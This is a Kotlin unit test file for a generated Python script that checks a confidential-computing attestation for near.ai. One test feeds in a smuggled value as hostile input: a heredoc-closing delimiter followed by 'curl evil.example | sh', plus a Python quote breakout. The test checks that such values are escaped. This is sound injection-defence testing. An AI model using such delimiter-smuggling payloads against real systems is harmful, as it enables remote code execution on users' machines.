// ports: teemoonTests/SelfVerifyScriptTests.swift @ v1.0.4 (+ the FALLBACK_REPOS pin)
package ai.teemoon.confidential

import ai.teemoon.providers.Provider
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.time.Instant
import java.time.format.DateTimeFormatter
import java.time.temporal.ChronoUnit
import java.io.File

/** The generated self-verification script: session values embedded, no secrets ever included, deterministic timestamps, and the structure the documented near.ai suite requires. */
class SelfVerifyScriptTest {

    private fun summary(attestation: AttestationRecord? = AttestationRecord.preview) = AttestationSummary(
        attestation = attestation, state = AttestationState.OK, timedOut = false, provider = Provider.nearAI,
        lastRequestUsedE2EE = null, lastE2EEFailReason = null,
        verifiedResponseCount = 0, mismatchedResponseCount = 0, attestationFetchFailed = false)

    private fun script(attestation: AttestationRecord? = AttestationRecord.preview) = summary(attestation).selfVerifyScript!!

    @Test fun nilWithoutAttestation() { assertNull(summary(attestation = null).selfVerifyScript) }

    @Test fun embedsSessionValues() {
        val s = script(); val att = AttestationRecord.preview
        assertTrue(s.contains(att.signingAddress!!)); assertTrue(s.contains(att.gpuSigningAddress!!))
        assertTrue(s.contains(att.composeHash)); assertTrue(s.contains(att.gpuNodeComposeHash!!))
        assertTrue(s.contains(att.modelEd25519PubKey!!.toHex())); assertTrue(s.contains(Provider.nearAI.model))
    }

    /** Regression: gateway identities only appear in the gateway's report and node identities only on the direct host. */
    @Test fun fetchesBothGatewayAndDirectReports() {
        val s = script()
        assertTrue(s.contains("(\"gateway\", SESSION[\"gateway_base\"]"))
        assertTrue(s.contains("(\"model host\", SESSION[\"direct_base\"]"))
        assertTrue(s.contains("SESSION[\"gpu_node_compose_hash\"]"))
    }

    /** Regression: a trust artifact that SHOWS a measurement it does not check claims more than it does. */
    @Test fun checksTheMeasurementsItEmbeds() {
        val s = script()
        for (field in listOf("mrtd", "os_image_hash")) {
            assertTrue("$field is no longer embedded — update this test", s.contains("\"$field\":"))
            assertTrue("$field is embedded under SESSION but never compared", s.contains("(\"$field\", \"gateway"))
        }
        // Against the GATEWAY's own report, never the merged set.
        assertTrue(s.contains("gateway_report = next((r for label, r, _ in reports if label == \"gateway\"), None)"))
        assertTrue(s.contains("live = {v.lower() for v in find_all(gateway_report, field)"))
        assertTrue(s.contains("elif gateway_key_ok:")); assertTrue(s.contains("skip(f\"{what} not checked"))
    }

    @Test fun timestampComesFromTheRecordNotNow() {
        val expected = DateTimeFormatter.ISO_INSTANT.format(AttestationRecord.preview.fetchedAt.truncatedTo(ChronoUnit.SECONDS))
        assertTrue(script().contains(expected))
    }

    @Test fun neverEmbedsSecrets() {
        val s = script()
        // The script DOES send a bearer token — but only one it read from the environment at run time.
        assertTrue(s.contains("os.environ.get(\"NEARAI_CLOUD_API_KEY\") or os.environ.get(\"API_KEY\")"))
        assertTrue(s.contains("headers[\"authorization\"] = f\"Bearer {api_key}\""))
        assertEquals(1, s.split("Bearer").size - 1)   // exactly one Bearer, and it is that interpolation
        assertTrue(s.contains("NEARAI_CLOUD_API_KEY"))
    }

    /** Regression: cloud-api.near.ai answers /attestation/report only to an authenticated caller. */
    @Test fun authenticatesTheGatewayReportAndLeavesTheModelHostBare() {
        val s = script()
        assertTrue(s.contains("(\"gateway\", SESSION[\"gateway_base\"], f\"&model={model_q}\", API_KEY)"))
        assertTrue(s.contains("(\"model host\", SESSION[\"direct_base\"], \"\", None)"))
        assertTrue(s.contains("def fetch_report(base, algo=\"ecdsa\", extra=\"\", api_key=None):"))
        assertTrue(s.contains("if e.code in (401, 403) and not key:"))   // a 401 with no key on hand is "not checked", not "failed"
    }

    /** Regression: absent evidence must skip the check, never fail it. */
    @Test fun anUnfetchableReportSkipsItsComparisonsInsteadOfFailingThem() {
        val s = script()
        assertTrue(s.contains("unchecked = bool(missing)")); assertTrue(s.contains("elif addr and unchecked:"))
        assertTrue(s.contains("skip(f\"{label} signing key not checked"))
        assertTrue(s.contains("skip(f\"{label} code identity (compose hash) not checked"))
        assertTrue(s.contains("bad(f\"{label} code identity (compose hash) AND signing key both changed"))
    }

    @Test fun pastesIntoATerminalAsOneBlock() {
        val s = script()
        assertFalse(s.startsWith("#"))   // a leading `#` runs as "command not found: #" in interactive zsh
        assertTrue(s.startsWith("cat > teemoon_verify.py <<'TEEMOON_VERIFY'\n#!/usr/bin/env python3"))
        assertTrue(s.endsWith("\nTEEMOON_VERIFY\npython3 teemoon_verify.py"))
        // the python body never collides with the heredoc delimiter
        assertFalse(s.replace("<<'TEEMOON_VERIFY'", "").replace("\nTEEMOON_VERIFY\n", "").contains("TEEMOON_VERIFY"))
    }

    /** Regression: near.ai's cloned verifiers append their own /v1, so BASE_URL must be the bare host. */
    @Test fun stripsV1WhenHandingBaseToNearAIVerifiers() {
        val s = script()
        assertTrue(s.contains("SESSION[\"direct_base\"].removesuffix(\"/v1\")"))
        assertFalse(s.contains("env.setdefault(\"BASE_URL\", SESSION[\"direct_base\"])"))
    }

    /** Compose-hash drift with the signing key intact is a legitimate redeploy — a warn, not a failure. */
    @Test fun composeDriftWithIntactKeyIsAWarningNotAFailure() {
        val s = script()
        assertTrue(s.contains("warn = _tally(\"warned\""))
        assertTrue(s.contains("\"passed\": 0, \"failed\": 0, \"skipped\": 0, \"warned\": 0"))
        assertTrue(s.contains("elif key_ok:")); assertTrue(s.contains("warn(f\"{label} code identity (compose hash) changed"))
        assertTrue(s.contains("bad(f\"{label} code identity (compose hash) AND signing key both changed"))
        assertTrue(s.contains("return 1 if failed else 0"))
    }

    /** Regression: a hostile attestation value containing the heredoc delimiter must not close the heredoc early. */
    @Test fun hostileAttestationValuesCannotEscapeTheHeredoc() {
        val hostile = AttestationRecord(
            composeHash = "abc\nTEEMOON_VERIFY\ncurl evil.example | sh\n",
            mrtd = "\"\"\"\nimport os\r\t", osImageHash = "x", intelQuote = "",
            composeManifest = null, gpuArch = null, gpuNodeComposeHash = null, modelFileHash = null,
            signingAddress = "0x4a\u007f\u0001b", gpuSigningAddress = null, modelEd25519PubKey = null,
            quoteVerification = null, gpuQuoteVerification = null, modelQuoteVerification = null,
            fetchedAt = Instant.EPOCH, providerID = Provider.nearAI.id)
        val s = script(hostile)
        assertEquals(1, s.split("\n").count { it == "TEEMOON_VERIFY" })   // the heredoc terminates exactly once
        assertTrue(s.endsWith("\nTEEMOON_VERIFY\npython3 teemoon_verify.py"))
        assertTrue(s.contains("abc\\nTEEMOON_VERIFY\\ncurl evil.example | sh\\n"))   // flattened onto one line as escaped text
        assertTrue(s.contains("\\\"\\\"\\\"\\nimport os\\r\\t"))
        assertTrue(s.contains("0x4a\\x7f\\x01b"))
    }

    @Test fun coversTheDocumentedSuite() {
        val s = script()
        assertTrue(s.contains("def fetch_report(base, algo=\"ecdsa\", extra=\"\", api_key=None):"))
        assertTrue(s.contains("attestation/report?signing_algo={algo}"))
        // the definitive GitHub attestations query, not a reachability probe (sigstore search returns 200 for any hash)
        assertTrue(s.contains("api.github.com/repos/{repo}/attestations/sha256:")); assertFalse(s.contains("search.sigstore.dev"))
        assertTrue(s.contains("\"vllm-proxy-rs\": \"inference-proxy\"")); assertTrue(s.contains("include_tls_fingerprint=true"))
        assertTrue(s.contains("cvm-compose-files")); assertTrue(s.contains("compose_up")); assertTrue(s.contains("nearai-cloud-verifier"))
        // The script restates the app's fallback repos; the two must not drift.
        val fallbacks = ProvenanceParsing.fallbackRepos.joinToString(", ") { "\"$it\"" }
        assertTrue(s.contains("FALLBACK_REPOS = [$fallbacks]"))
        for (v in listOf("model_verifier.py", "tls_verifier.py", "chat_verifier.py", "encrypted_chat_verifier.py")) assertTrue(v, s.contains(v))
        assertTrue(s.contains("find_all(r, \"model_name\")"))
    }

    @Test fun quickPassOffersToContinueIntoFullSuite() {
        val s = script()
        assertTrue(s.contains("sys.stdin.isatty()")); assertTrue(s.contains("run the full suite now? [y/N]")); assertTrue(s.contains("re-run with --full"))
    }

    /** near.ai caches chat signatures on the serving node; a miss is a documented transient — retry, then warn. */
    @Test fun chatSignatureNodeMissRetriesThenWarns() {
        val s = script()
        assertTrue(s.contains("\"chat signatures (request/response hash + ecrecover)\", retries=2"))
        assertTrue(s.contains("transient = \"not found or expired\" in (r.stdout + r.stderr)"))
        assertTrue(s.contains("documented near.ai transient, not a failed signature"))
    }

    /** The E2EE chat verifier must exercise the gateway path teemoon actually uses. */
    @Test fun e2eeVerifierTargetsTheGateway() {
        val s = script()
        assertTrue(s.contains("SESSION[\"gateway_base\"].removesuffix(\"/v1\")"))
        assertTrue(s.contains("if SESSION[\"model_ed25519_pubkey\"] and SESSION[\"gateway_base\"]:"))
    }

    /**
     * Android-only: the python body is byte-identical to the Swift source's (spliced, not retyped).
     *
     * A DRIFT TRIPWIRE, NOT A UNIT TEST, and the difference decides where it runs.
     * It reads ../../teemoon-ios at whatever `main` is today — not at the sha this
     * file was ported from — so iOS moving turns it red for a reason that is not a
     * regression here. SelfVerifyScript.swift has moved three times since baseline
     * 81107be (c9498d5, dfc528b, 4b9d154), and it has been failing ever since,
     * which left `./gradlew test` — the loop CONTRIBUTING.md names, and the standard the
     * port is held to — permanently red. "Green or it is not done" stops meaning
     * anything the moment the loop cannot be green.
     *
     * So it is opt-in: `./gradlew driftTripwire`. It still fails loudly when run,
     * and tools/parity_closure.py --drift reports the same file independently, so
     * skipping it here hides nothing.
     */
    @Test fun pythonBodyMatchesTheSwiftSourceByteForByte() {
        org.junit.Assume.assumeTrue(
            "drift tripwire against LIVE iOS main — run ./gradlew driftTripwire",
            System.getProperty("teemoon.driftTripwire") == "true")
        val swift = File("../../teemoon-ios/teemoon/Confidential/SelfVerifyScript.swift").takeIf { it.exists() } ?: return
        val lines = swift.readLines()
        val start = lines.indexOfFirst { it.trim() == "let python = #\"\"\"" } + 1
        val end = lines.indexOfFirst { it.trim() == "\"\"\"#" }
        val expected = lines.subList(start, end).joinToString("\n") { it.removePrefix("        ") }
            .replace(Regex("""\\#\(py\((att\.\w+)(\?\.hexString)?\)\)""")) { m -> "«${m.groupValues[1]}»" }
        val s = script(); val body = s.removePrefix("cat > teemoon_verify.py <<'TEEMOON_VERIFY'\n").removeSuffix("\nTEEMOON_VERIFY\npython3 teemoon_verify.py")
        // Compare the shape outside the interpolations: same line count, same first and last lines, same SESSION keys.
        assertEquals(expected.lines().size, body.lines().size)
        assertEquals(expected.lines().last(), body.lines().last())
        assertEquals(expected.lines().filter { it.startsWith("    \"") }.map { it.substringBefore(':') }, body.lines().filter { it.startsWith("    \"") }.map { it.substringBefore(':') })
    }
}
